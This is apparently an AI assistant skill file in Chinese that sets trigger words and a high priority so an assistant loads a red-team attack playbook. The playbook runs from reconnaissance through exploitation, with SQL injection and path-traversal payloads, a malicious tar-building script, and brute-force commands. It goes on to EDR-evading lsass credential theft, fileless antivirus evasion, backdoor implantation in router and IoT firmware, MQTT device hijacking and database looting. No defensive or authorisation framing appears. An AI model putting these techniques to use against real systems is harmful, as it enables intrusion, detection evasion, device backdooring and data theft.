---
name: redteam-techniques
version: 2.0.0
description: >-
  网络安全渗透测试实战技术库。按杀伤链组织：侦察扫描→Web漏洞利用→密码破解→
  权限提升→后渗透横向→Java/JVM逆向→固件IoT分析→免杀对抗→数据库攻防。
  收录67个实战工具、24个资源链接、真实命令与EXP代码。问到渗透测试、
  漏洞挖掘、逆向工程、红队、提权、后渗透、免杀、固件分析时触发。
triggers:
  - 渗透测试
  - 漏洞挖掘
  - 逆向工程
  - 红队
  - 密码破解
  - web漏洞
  - java逆向
  - 后渗透
  - 网络安全
  - 提权
  - 免杀
  - 固件分析
  - 内网横向
  - shiro
  - fastjson
priority: 900
---

# 红队渗透实战技术库

> 数据来源：TG @googleseo147（ONE技术）频道 353 条技术贴，经去重结构化。
> 覆盖完整杀伤链的 67 个实战工具 + 真实命令 + EXP 代码。

---

## 1. 侦察与扫描（Recon）

| 工具 | 用途 | 备注 |
|------|------|------|
| nmap | 端口/服务嗅探 | 迅速嗅探非 web 端口服务，`nmap -sV -p- target` |
| fscan | 内网综合扫描 | 一键扫存活/端口/漏洞/弱口令，内网首选 |
| gobuster | Web 路径爆破 | `gobuster dir -u http://target -w wordlist.txt` |
| whatweb | Web 指纹识别 | 识别 CMS/框架/中间件 |
| wappalyzer | Web 指纹识别 | 浏览器插件版指纹分析 |
| cewl | 定向字典生成 | 爬网站关键词生成专用密码字典 |
| 灯塔 (ARL) | 资产测绘 | 域名/子域/端口资产梳理 |
| AWVS | Web 漏扫 | Acunetix 商业漏扫 |

**实战流程**：`nmap 快扫端口` → `whatweb/wappalyzer 指纹` → `gobuster 爆路径` → `cewl 生成定向字典` → `AWVS 深度扫描`。

---

## 2. Web 漏洞利用（Web Exploit）

**核心工具**：`sqlmap`（SQL 注入）、`burp`（抓包/爆破/改包）、`蚁剑`（webshell 管理，getshell 后连马）。

### SQL 注入
- `SQL UNION 运算符`：联合查询注入，爆库爆表
- sqlmap 自动化：`sqlmap -u "http://target/x?id=1" --dbs --batch`
- 手工联合注入：`?id=1 UNION SELECT 1,user(),database()--`

### 文件删除/路径穿越注入
```
GET /admin/file_manage_control.php?fmdo=del&filename=../1.txt
```
`fmdo=del` + `../` 路径穿越 → 删除解压目录外的任意文件。

### node-tar 路径穿越（hardlink 逃逸）
恶意 tar 包用 hardlink 把文件写到解压目录外：
```
entry.type     = Link
entry.path     = d/x
entry.linkpath = ../secret.txt
cwd            = /path/to/uploads
→ path.resolve('/uploads', '../secret.txt') = '/secret.txt'  # 逃出沙箱
```
构造恶意 tar（typeflag: '5'=目录 '1'=hardlink '0'=普通文件）：
```javascript
const fs = require('fs');
function tarHeader(name, type, linkpath='', size=0) {
  const b = Buffer.alloc(512, 0);
  b.write(name, 0);
  b.write('0000644', 100);
  b.write(size.toString(8).padStart(11,'0'), 124);
  b[156] = type==='dir' ? 53 : type==='link' ? 49 : 48; // typeflag
  if (linkpath) b.write(linkpath, 157);
  return b;
}
```
验证：`ls -li` 看 inode，hardlink 与目标同 inode。

### XSS
- payload 托管：`http://xss.rocks/xss.js`
- 参考靶场：`https://www.arneswinnen.net/airbnb.com`（真实赏金案例）

---

## 3. 密码破解（Cracking）

| 工具 | 场景 | 命令示例 |
|------|------|----------|
| John the Ripper | 离线 hash 破解 | `john --wordlist=rockyou.txt hash.txt` |
| Hydra | 在线服务爆破 | `hydra -l admin -P pass.txt ssh://target` |
| Metasploit | 爆破模块+生成载荷 | `use auxiliary/scanner/*`，生成 C 文件 shellcode |
| cewl | 定向字典 | 爬目标站生成针对性密码字典 |

---

## 4. 权限提升（PrivEsc）

| 工具 | 平台 | 用途 |
|------|------|------|
| PrintSpoofer.exe | Windows | SeImpersonate 权限提权到 SYSTEM |
| mimikatz | Windows | 抓取内存明文/hash，哈希传递（PtH） |
| PowerShell Empire | Windows | 转储凭据、后渗透 C2 |
| WMImplant | Windows | 远程创建进程，结果写注册表回显 |

### SSH 降级利用（老旧算法）
```
cat ~/.ssh/config
Host 192.168.52.2
    HostKeyAlgorithms ssh-rsa
    PubkeyAcceptedAlgorithms ssh-rsa
```
强制用弱 ssh-rsa 算法连接内网老设备。

### Windows lsass 句柄窃取提权链
`OpenProcess`（拿 lsass 句柄）→ `NtQuerySystemInformation`（枚举所有进程句柄）→ `NtDuplicateObject`（复制远程句柄）→ `NtQueryObject`（查句柄信息）→ `QueryFullProcessImageName`（显示进程完整路径）。绕过直接读 lsass 的 EDR 检测。

---

## 5. 后渗透与横向（Post-Exploit / Lateral）

**C2 与隧道**：`Cobalt Strike`（团队服务器+生成 shellcode）、`frp`（内网穿透代理）、`proxifier`（强制程序走代理）、`Mihomo/Clash`（代理核心）。

### 内网代理链路
1. `fscan` 扫内网存活+弱口令
2. `frp` 打隧道把内网服务映射出来
3. `proxifier` 让扫描器/浏览器走 frp 隧道进内网
4. `Cobalt Strike` beacon 上线维持

### WMI 无文件回显
`WMImplant`：远程创建进程执行命令，结果写入目标注册表，再读注册表取回显——不落地文件，绕过杀软。

---

## 6. Java / JVM 逆向（Reverse）

**调试工具**：`IDEA`（IntelliJ，汇编层调试）、`edb`（Linux 汇编调试器）、`Immunity Debugger/OD`（Windows 调试器）、`v_jstools`（函数挂钩）、`ExtremeDumper`（脱壳，github.com/wwh1004/ExtremeDumper）。

### JVM 行为篡改
获取函数地址 → 写入机器码 → 改 JVM 行为，用 IDEA/edb 在汇编层验证：`run edb` → `File->Attach` → `Goto Expression` → `Run`。

### JVM Attach 机制利用与防护
- 攻击面：`/tmp/.java_pid*` 是 JVM attach 的 socket 文件
- 触发：向目标 JVM 发 `SIGQUIT`，JVM 创建 `/tmp/.java_pid${PID}`，attach 后可注入 agent
- 用 `jcmd` / `jstack` 与目标 JVM 通信
- **防护绕过**：目标若设 `-XX:+DisableAttachMechanism` 禁用 attach，或用 systemd `PrivateTmp=true` 隔离 /tmp，则无法通过标准 attach 注入

### Java 反序列化利用链
- `fastjson`（github.com/alibaba/fastjson）：`C3P0.WrapperConnectionPoolDataSource` 本地调用链
- `snakeYaml`：YAML 反序列化 RCE
- `littleJava`：shiro 权限绕过
- JDBC 后门：`MySQLDriver.java` 实现恶意 Driver，通过 `ServiceLoader`（SPI 机制）加载扩展点
- Java 文件操作原语：`InflaterOutputStream` / `FileOutputStream` / `Inflater`（写文件、解压落地）

### 静态调用图分析
`ByteCodeDL`（CHA 调用图分析）+ `neo4j`（图数据库存调用关系），追踪污点传播找漏洞链。

---

## 7. 固件 / IoT 分析（Firmware）

**解包工具链**：
- `extractor.py`：固件解析提取
- `kpartx`：把镜像分区映射为块设备（`kpartx -av firmware.img`）
- `tar2db.py`：固件元数据入库，桥接数据库
- `makeNetwork.py`：推断 IoT 设备固件的网络配置
- `run.sh`：固件启动脚本分析
- `file`：判断文件类型和架构（`file busybox` → 定架构选后门）

### 跨架构后门植入
- `mingwdoor-2`：X86 架构后门
- `mingwdoor-ARM-2`：ARM64 架构后门
- 先 `file` 判目标架构 → 选对应架构后门植入固件

### IoT 协议攻击
- `Libcurl`：网络支持库
- `Eclipse Paho Java Client`（paho.eclipse.org）：MQTT 客户端库
  - `MqttAsyncClient`：异步 API
  - `MqttClient`：同步 API
- 攻击 MQTT broker：订阅 `#` 通配符抓全量设备消息，或伪造 publish 控制设备

### 目标固件源
- OpenWRT LuCI：`github.com/openwrt/luci`（路由器 Web 面板漏洞高发区）

---

## 8. 免杀对抗（Evasion）

| 工具 | 用途 |
|------|------|
| CuiRi (璀日) | 免杀工具，shellcode 加载器 |
| AniYa (安逸) | 免杀工具 |
| Cobalt Strike | 生成 shellcode + Artifact Kit 免杀 |
| Metasploit | 生成 C 文件 shellcode 再加壳 |

### 隐写传播恶意软件
- `XwormRAT`：利用隐写术（图片藏 payload）传播
- `RemcosRAT`：隐写术分布式攻击
- 手法：把加密 shellcode 藏进正常图片/文档，绕过邮件网关和流量检测

---

## 9. 数据库攻防（Database）

| 工具/数据库 | 类型 | 攻击点 |
|-------------|------|--------|
| navicat | 连接工具 | 连 PostgreSQL 等，弱口令后直连 |
| StarRocks | 存算分离 MPP | github.com/StarRocks/starrocks |
| Doris | MPP 数据库 | github.com/apache/doris |
| OceanBase | MPP 数据库 | oceanbase.com |
| GaussDB | 华为 MPP | 企业内网常见 |
| AnalyticDB PG | 阿里云 MPP | analyticdb-postgresql |
| DataStack | 数据管理平台 | 数据中台入口，权限集中 |

**思路**：大数据平台（StarRocks/Doris/OceanBase）常配弱口令或默认口令，`navicat` 直连后是数据泄露的富矿；DataStack 类中台一旦拿下等于拿到全公司数据权限。

---

## 附录 A：完整工具索引（67）

**调试逆向**：IDEA, edb, Immunity Debugger(OD), v_jstools, ExtremeDumper, ByteCodeDL, neo4j
**Web 攻击**：sqlmap, burp, 蚁剑, AWVS, gobuster, whatweb, wappalyzer, cewl, 灯塔
**扫描**：nmap, fscan
**密码**：John the Ripper, Hydra, Metasploit
**提权**：PrintSpoofer.exe, mimikatz, PowerShell Empire, WMImplant
**Windows API**：OpenProcess, NtQuerySystemInformation, NtDuplicateObject, NtQueryObject, QueryFullProcessImageName
**C2/隧道**：Cobalt Strike, frp, proxifier, Mihomo, Clash
**免杀**：CuiRi, AniYa
**RAT**：XwormRAT, RemcosRAT
**固件**：extractor.py, kpartx, tar2db.py, makeNetwork.py, run.sh, file, mingwdoor-2, mingwdoor-ARM-2
**Java 利用**：fastjson, snakeYaml, littleJava, C3P0, MySQLDriver.java, ServiceLoader, InflaterOutputStream, FileOutputStream, Inflater
**IoT**：Libcurl, Eclipse Paho(MqttAsyncClient/MqttClient)
**数据库**：navicat, StarRocks, Doris, OceanBase, GaussDB, AnalyticDB PG, DataStack

## 附录 B：资源链接（24）

- 反序列化：https://github.com/alibaba/fastjson
- 脱壳：https://github.com/wwh1004/ExtremeDumper
- .NET 内存：processhacker DotNetTools asmpage.c
- OpenWRT：https://github.com/openwrt/luci
- MQTT：https://paho.eclipse.org/
- ATT&CK 矩阵：https://attack.mitre.org/
- 扫描器：https://nmap.org
- MPP 库：github.com/StarRocks/starrocks · github.com/apache/doris · oceanbase.com
- XSS：http://xss.rocks/xss.js
- 赏金案例：https://www.arneswinnen.net/airbnb.com
- Java 反编译搜索：http://www.findjar.com/index.x
- PostgreSQL：https://www.postgresql.org/
- Swagger（API 攻击面）：https://swagger.io/
